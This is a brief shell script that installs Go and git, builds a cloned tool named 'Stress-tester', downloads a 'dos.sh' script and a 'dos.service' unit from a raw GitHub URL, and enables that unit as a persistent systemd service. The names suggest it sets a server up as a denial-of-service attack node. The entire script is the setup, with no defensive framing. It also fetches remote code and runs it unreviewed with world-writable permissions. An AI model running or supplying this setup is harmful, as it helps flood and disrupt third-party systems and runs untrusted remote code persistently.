apt update
apt upgrade -y
apt install git -y
apt install golang -y
ulimit -n 999999
git clone https://github.com/Leeon123/Stress-tester.git
cd Stress-tester
go build stress.go
wget https://raw.githubusercontent.com/Tokaaaaage/dos/main/dos.sh
chmod 777 dos.sh
cd /etc/systemd/system
wget https://raw.githubusercontent.com/Tokaaaaage/dos/main/dos.service
systemctl daemon-reload
systemctl restart dos
systemctl enable dos
